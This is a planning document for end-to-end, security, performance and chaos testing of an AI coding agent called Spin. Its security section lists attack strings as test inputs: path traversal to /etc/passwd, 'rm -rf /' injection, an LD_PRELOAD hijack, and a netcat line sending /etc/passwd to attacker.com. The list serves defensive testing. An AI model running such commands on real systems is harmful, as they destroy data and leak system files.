# FRD-20251012122030: E2E Testing and Production Hardening

**Feature:** Feature 5.3 - E2E Testing and Hardening
**Priority:** P0 (Production readiness blocker)
**Estimated Effort:** 3-4 days
**Created:** 2025-10-12
**Status:** Planning

---

## Overview

This FRD defines comprehensive end-to-end (E2E) testing and production hardening for the Spin AI coding agent. The goal is to ensure production readiness through:

1. **E2E Test Suite**: Real user flow testing across all major features
2. **Security Hardening**: Adversarial testing and vulnerability audit
3. **Performance Optimization**: Stress testing and bottleneck elimination
4. **Chaos Testing**: Concurrent operations, edge cases, failure scenarios

## Motivation

While Spin has excellent unit/integration test coverage (85%+), it lacks comprehensive E2E tests that exercise full user workflows. Production readiness requires:

- **User Flow Validation**: Ensure all features work together end-to-end
- **Security Assurance**: Verify security boundaries prevent attacks
- **Performance Confidence**: Validate performance under production loads
- **Robustness**: Graceful failure handling and recovery

## Success Criteria

### E2E Testing
- [ ] ✅ Full conversation flow tests (user → LLM → tools → response)
- [ ] ✅ Multi-turn conversation with context preservation
- [ ] ✅ Tool chain integration (search → read → patch → git)
- [ ] ✅ Error recovery and retry flows
- [ ] ✅ All tests pass with `-race` detector
- [ ] ✅ All tests pass on macOS and Linux

### Security Hardening
- [ ] ✅ All path traversal vectors blocked
- [ ] ✅ All command injection attempts blocked
- [ ] ✅ Symlink escape attempts blocked
- [ ] ✅ Credential leakage prevented (verified in logs/errors)
- [ ] ✅ Audit logging verified for all security events
- [ ] ✅ Sandbox enforcement validated

### Performance Validation
- [ ] ✅ Stress test: 10k+ block timelines
- [ ] ✅ Large file handling: >100k line files
- [ ] ✅ Concurrent operations: 10+ tool calls in parallel
- [ ] ✅ Memory stability: <10% heap growth over long sessions
- [ ] ✅ All performance SLOs met (see benchmarks)

### Chaos Testing
- [ ] ✅ Deep directory trees (100+ levels)
- [ ] ✅ Permission errors (read-only files)
- [ ] ✅ Disk full scenarios
- [ ] ✅ Network timeouts during LLM streaming
- [ ] ✅ Malformed LLM responses
- [ ] ✅ Concurrent file modifications

---

## Requirements

### 1. E2E Test Suite

#### 1.1 Full Conversation Flows

**Test:** `TestE2E_FullConversation`
- User submits prompt
- LLM generates response with tool calls
- Tools execute successfully
- Agent streams response to user
- Conversation state preserved

**Scenarios:**
1. Simple query: "What is the current git branch?"
2. Multi-step task: "Search for test files, read the first one, and summarize it"
3. File modification: "Create a new file called test.txt with 'Hello, World!'"
4. Error recovery: LLM calls tool with invalid arguments, agent retries

**Verification:**
- Events emitted in correct order
- Tool results returned to LLM
- Final response contains expected content
- No crashes or panics

#### 1.2 Tool Chain Integration

**Test:** `TestE2E_ToolChain`
- Chain multiple tools in sequence
- Verify data flows correctly between tools
- Ensure context preservation across tool calls

**Scenarios:**
1. **Search → Read → Analyze**:
   - `file_search("test")` → find test files
   - `read_file(results[0])` → read first result
   - LLM analyzes content

2. **Git → Modify → Commit**:
   - `git_context()` → get branch/status
   - `apply_patch()` → modify files
   - `execute_command("git add .")` → stage changes

3. **Search → Multi-read → Patch**:
   - `file_search("*.go")` → find Go files
   - `read_file()` × 3 → read multiple files
   - `apply_patch()` → modify multiple files

**Verification:**
- Each tool receives correct input from previous tool
- Tool failures propagate correctly
- Agent handles partial failures gracefully

#### 1.3 Multi-Turn Conversations

**Test:** `TestE2E_MultiTurnConversation`
- Multiple user prompts in sequence
- Context preserved across turns
- History truncation works correctly

**Scenarios:**
1. **Context Preservation**:
   - Turn 1: "What files are in the current directory?"
   - Turn 2: "Read the first one" (references Turn 1 results)
   - Turn 3: "Summarize what you found" (references Turns 1-2)

2. **History Truncation**:
   - Submit 100 turns
   - Verify history truncated to fit token limit
   - Verify critical context retained

**Verification:**
- Agent maintains context across turns
- History truncated correctly when needed
- No memory leaks or unbounded growth

#### 1.4 Error Recovery

**Test:** `TestE2E_ErrorRecovery`
- Simulate various error conditions
- Verify agent handles gracefully
- Ensure proper cleanup

**Scenarios:**
1. **LLM Errors**:
   - Network timeout during streaming
   - Malformed response (invalid JSON)
   - Rate limit exceeded

2. **Tool Errors**:
   - Invalid tool arguments
   - Tool execution failure (permission denied)
   - Tool timeout

3. **System Errors**:
   - Disk full during file write
   - Out of memory
   - File locked by another process

**Verification:**
- Clear error messages shown to user
- No partial state committed
- Resources cleaned up (files, connections, goroutines)
- Agent remains operational after error

---

### 2. Security Hardening

#### 2.1 Path Traversal Prevention

**Test:** `TestE2E_Security_PathTraversal`

**Attack Vectors:**
```go
// Absolute paths
"/etc/passwd"
"C:\\Windows\\System32\\config"

// Relative traversal
"../../../etc/passwd"
"..\\..\\..\\Windows\\System32"

// Hidden traversal
"foo/../../../etc/passwd"
"./././../../etc/passwd"

// URL-encoded traversal
"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

// Symlink escapes
"symlink-to-etc" -> "/etc"
"nested/../../symlink-to-root" -> "/"
```

**Tools to Test:**
- `read_file`
- `write_file`
- `list_directory`
- `apply_patch`
- `file_search`

**Verification:**
- All attempts blocked with clear error
- Errors logged to audit log
- No files accessed outside workspace

#### 2.2 Command Injection Prevention

**Test:** `TestE2E_Security_CommandInjection`

**Attack Vectors:**
```go
// Shell injection
"ls; rm -rf /"
"ls $(whoami)"
"ls `cat /etc/passwd`"

// Pipe injection
"ls | nc attacker.com 1234 < /etc/passwd"

// Background execution
"ls & malicious-process &"

// Environment manipulation
"PATH=/tmp ls"
"LD_PRELOAD=/tmp/malicious.so ls"
```

**Verification:**
- All attempts blocked by validator
- Classified as Dangerous or Forbidden
- User approval required (or command rejected)
- Logged to audit log

#### 2.3 Credential Leakage Prevention

**Test:** `TestE2E_Security_CredentialLeakage`

**Scenarios:**
1. API key in error message
2. API key in tool output
3. API key in logs
4. API key in crash dump
5. API key in debug output

**Verification:**
- No credentials in logs (check all log files)
- No credentials in error messages
- No credentials in tool output
- Credentials stored only in platform keystore

#### 2.4 Sandbox Enforcement

**Test:** `TestE2E_Security_Sandbox`

**Modes to Test:**
1. **read-only**: No file modifications allowed
2. **workspace-write**: Writes only within workspace
3. **full-access**: All operations allowed

**Operations to Test:**
- File read/write inside workspace
- File read/write outside workspace
- Command execution
- Network access
- Symlink creation

**Verification:**
- read-only mode blocks all writes
- workspace-write mode blocks writes outside workspace
- full-access mode allows all operations
- Violations logged to audit log

---

### 3. Performance Validation

#### 3.1 Stress Testing

**Test:** `TestE2E_Performance_StressTest`

**Scenarios:**

1. **Large Timeline (10k blocks)**:
   ```go
   for i := 0; i < 10000; i++ {
       timeline.Append(blocks.NewSummaryBlock(fmt.Sprintf("Block %d", i)))
   }
   // Verify viewport render <16ms
   // Verify memory stable (<10% growth)
   ```

2. **Large File Operations (100k lines)**:
   ```go
   largeFile := generateFile(100000) // 100k lines
   // Apply patch to large file
   // Verify completion <5s
   // Verify memory usage <100MB
   ```

3. **Deep Directory Tree (100 levels)**:
   ```go
   createDeepTree("/tmp/test", 100) // 100 levels deep
   // Run file_search
   // Verify completion <1s
   // Verify no stack overflow
   ```

4. **Concurrent Tool Execution (10 parallel)**:
   ```go
   for i := 0; i < 10; i++ {
       go tool.Execute(ctx, params)
   }
   // Verify all complete successfully
   // Verify no race conditions
   // Verify no deadlocks
   ```

**Performance SLOs:**
| Operation | Target | Current |
|-----------|--------|---------|
| Viewport render (40 blocks) | <16ms | 0.52ms ✅ |
| Block append (10k blocks) | <1ms | 2.9µs ✅ |
| File search (10k files) | <100ms | ~12.5ms ✅ |
| Patch apply (typical) | <1s | - ⏳ |
| Git status | <200ms | - ⏳ |

#### 3.2 Memory Stability

**Test:** `TestE2E_Performance_MemoryStability`

**Scenarios:**
1. **Long Session (1000 turns)**:
   - Run 1000 conversation turns
   - Measure heap size after each 100 turns
   - Verify <10% growth after GC

2. **Streaming Stability**:
   - Stream 1M chunks
   - Measure memory during streaming
   - Verify no unbounded growth

**Verification:**
- No memory leaks (constant heap after GC)
- No goroutine leaks (constant goroutine count)
- No file descriptor leaks (constant FD count)

#### 3.3 Latency Benchmarks

**Test:** `BenchmarkE2E_*`

**Benchmarks:**
```go
BenchmarkE2E_ToolExecution           // Individual tool latency
BenchmarkE2E_LLMStreaming            // Streaming throughput
BenchmarkE2E_ViewportRender          // UI render latency
BenchmarkE2E_EventProcessing         // Event loop latency
BenchmarkE2E_HistoryTruncation       // History management
```

**Targets:**
- Tool execution: <100ms (excluding actual work)
- Event processing: <1ms per event
- Viewport render: <16ms (60fps)

---

### 4. Chaos Testing

#### 4.1 Concurrent Modifications

**Test:** `TestE2E_Chaos_ConcurrentModifications`

**Scenarios:**
1. **Concurrent File Writes**:
   - 10 goroutines write to different files
   - Verify all writes succeed
   - Verify no data corruption

2. **Concurrent Patch Applications**:
   - 10 goroutines apply different patches
   - Verify all patches applied correctly
   - Verify no conflicts

3. **Concurrent Tool Calls**:
   - Mix of read/write/execute tools
   - Verify all complete successfully
   - Verify no race conditions

**Verification:**
- All operations complete successfully
- No data corruption
- No deadlocks or race conditions
- Clean error messages on conflicts

#### 4.2 Permission Errors

**Test:** `TestE2E_Chaos_Permissions`

**Scenarios:**
1. **Read-only Files**:
   ```go
   os.Chmod("file.txt", 0444) // read-only
   // Attempt write_file
   // Verify clean error message
   ```

2. **Inaccessible Directory**:
   ```go
   os.Chmod("dir", 0000) // no permissions
   // Attempt list_directory
   // Verify clean error message
   ```

3. **Permission Change During Operation**:
   ```go
   // Start reading file
   // Change permissions mid-read
   // Verify graceful failure
   ```

**Verification:**
- Clear error messages
- Proper cleanup (no leaked file handles)
- Agent remains operational

#### 4.3 Disk Full Scenarios

**Test:** `TestE2E_Chaos_DiskFull`

**Scenarios:**
1. **Write Fails Mid-Operation**:
   - Mock filesystem with limited space
   - Attempt large file write
   - Verify graceful failure
   - Verify partial writes cleaned up

2. **Patch Apply on Full Disk**:
   - Mock full disk
   - Attempt patch application
   - Verify rollback on failure
   - Verify no partial state

**Verification:**
- Clear error messages ("disk full")
- Atomic operations (all-or-nothing)
- No partial state left behind

#### 4.4 Network Failures

**Test:** `TestE2E_Chaos_NetworkFailures`

**Scenarios:**
1. **Timeout During LLM Streaming**:
   - Mock LLM with delayed response
   - Context timeout triggers
   - Verify clean cancellation

2. **Connection Loss Mid-Stream**:
   - Start streaming
   - Close connection mid-stream
   - Verify graceful failure

3. **Retry Logic**:
   - Mock transient failures
   - Verify exponential backoff
   - Verify eventual success

**Verification:**
- Clean timeout handling
- Proper retry with backoff
- Clear error messages
- No zombie goroutines

#### 4.5 Malformed LLM Responses

**Test:** `TestE2E_Chaos_MalformedLLM`

**Scenarios:**
1. **Invalid JSON**:
   ```json
   {"response": "incomplete...
   ```

2. **Invalid Tool Call**:
   ```json
   {"tool": "nonexistent_tool", "args": {}}
   ```

3. **Missing Required Fields**:
   ```json
   {"tool": "read_file"}  // missing "args"
   ```

4. **Type Mismatches**:
   ```json
   {"tool": "read_file", "args": {"path": 123}}  // path should be string
   ```

**Verification:**
- Parse errors caught gracefully
- Clear error messages
- Agent can recover and continue
- No panics

---

## Implementation Plan

### Phase 1: E2E Test Infrastructure (Day 1)

**Tasks:**
1. Create `e2e/` test package
2. Implement test helpers:
   - `NewTestAgent()`: Create agent with mock LLM
   - `NewTestWorkspace()`: Create temp workspace with test files
   - `AssertEventSequence()`: Verify event order
   - `AssertNoErrors()`: Check for errors in results
3. Create mock LLM with configurable responses
4. Create test fixtures (sample files, patches, etc.)

**Files:**
- `e2e/helpers.go` - Test helpers and utilities
- `e2e/fixtures.go` - Test fixtures and sample data
- `e2e/mocks.go` - Mock implementations

### Phase 2: E2E Tests (Day 2-3)

**Tasks:**
1. Implement conversation flow tests
2. Implement tool chain tests
3. Implement multi-turn tests
4. Implement error recovery tests

**Files:**
- `e2e/conversation_test.go` - Full conversation flows
- `e2e/toolchain_test.go` - Tool integration tests
- `e2e/multiturn_test.go` - Multi-turn conversations
- `e2e/errors_test.go` - Error recovery

### Phase 3: Security & Chaos Tests (Day 3)

**Tasks:**
1. Implement security tests (path traversal, injection, etc.)
2. Implement chaos tests (concurrent, permissions, disk full, etc.)
3. Implement performance validation tests

**Files:**
- `e2e/security_test.go` - Security boundary tests
- `e2e/chaos_test.go` - Chaos testing
- `e2e/performance_test.go` - Performance validation

### Phase 4: Hardening & Optimization (Day 4)

**Tasks:**
1. Fix any issues found by E2E tests
2. Improve error messages based on test failures
3. Add missing logging/tracing
4. Performance optimizations if SLOs not met
5. Update documentation

**Files:**
- Various bugfixes across codebase
- Updated error messages
- Performance improvements

---

## Test Coverage Goals

### E2E Test Coverage

| Category | Test Count | Status |
|----------|------------|--------|
| Conversation flows | 4 | ⏳ Pending |
| Tool chains | 3 | ⏳ Pending |
| Multi-turn | 2 | ⏳ Pending |
| Error recovery | 4 | ⏳ Pending |
| **Subtotal** | **13** | **⏳** |
| | | |
| Path traversal | 6 | ⏳ Pending |
| Command injection | 6 | ⏳ Pending |
| Credential leakage | 5 | ⏳ Pending |
| Sandbox enforcement | 3 | ⏳ Pending |
| **Subtotal** | **20** | **⏳** |
| | | |
| Stress tests | 4 | ⏳ Pending |
| Memory stability | 2 | ⏳ Pending |
| Latency benchmarks | 5 | ⏳ Pending |
| **Subtotal** | **11** | **⏳** |
| | | |
| Concurrent modifications | 3 | ⏳ Pending |
| Permission errors | 3 | ⏳ Pending |
| Disk full | 2 | ⏳ Pending |
| Network failures | 3 | ⏳ Pending |
| Malformed LLM | 4 | ⏳ Pending |
| **Subtotal** | **15** | **⏳** |
| | | |
| **TOTAL** | **59** | **⏳ Pending** |

### Code Coverage Impact

- **Current**: 85%+ across most packages
- **Target**: Maintain ≥85%, aim for ≥90% on critical paths
- **Expected**: E2E tests will increase coverage by ~2-5%

---

## Definition of Done

### Testing
- [ ] All 59 E2E tests implemented and passing
- [ ] All tests pass with `-race` detector (zero race conditions)
- [ ] All tests pass on macOS and Linux
- [ ] All benchmarks meet performance SLOs
- [ ] Code coverage maintained ≥85%

### Security
- [ ] All path traversal attacks blocked
- [ ] All command injection attempts blocked
- [ ] All credential leakage tests pass
- [ ] Sandbox enforcement verified
- [ ] Audit logging verified for all security events

### Performance
- [ ] All performance SLOs met
- [ ] No memory leaks (verified with 1000-turn test)
- [ ] No goroutine leaks (verified with concurrent tests)
- [ ] No file descriptor leaks

### Quality
- [ ] `make lint` passes (zero errors)
- [ ] `uast parse | herr analyze` clean (complexity ≤15)
- [ ] All error messages clear and actionable
- [ ] Logging comprehensive for debugging

### Documentation
- [ ] Update ROADMAP.md with completion status
- [ ] Update AGENTS.md if needed
- [ ] Add E2E testing guide in docs/
- [ ] Update README.md with production readiness status

---

## Risk Assessment

### High Risk

1. **E2E Test Flakiness**
   - Mitigation: Use hermetic test environments, deterministic mocks, proper cleanup

2. **Performance Regressions**
   - Mitigation: Run benchmarks before/after, profile hotspots, maintain SLOs

3. **Cross-Platform Issues**
   - Mitigation: Test on macOS and Linux, use platform-specific build tags

### Medium Risk

1. **Test Maintenance Burden**
   - Mitigation: Keep tests focused, avoid brittle assertions, use helper functions

2. **Mock Complexity**
   - Mitigation: Use simple mocks, avoid over-mocking, test real components when possible

---

## Dependencies

- All Phase 1-5.1 features must be complete
- Go 1.24+
- Test infrastructure (existing)
- CI/CD pipeline (for automated testing)

---

## References

- [AGENTS.md](../../AGENTS.md) - Workflow and quality standards
- [ROADMAP.md](../tools-modules/ROADMAP.md) - Project roadmap
- [docs/packages/](../../docs/packages/) - Package documentation
- [docs/performance.md](../../docs/performance.md) - Performance benchmarks

---

**Last Updated:** 2025-10-12
**Status:** ✅ FRD Complete, ready for implementation
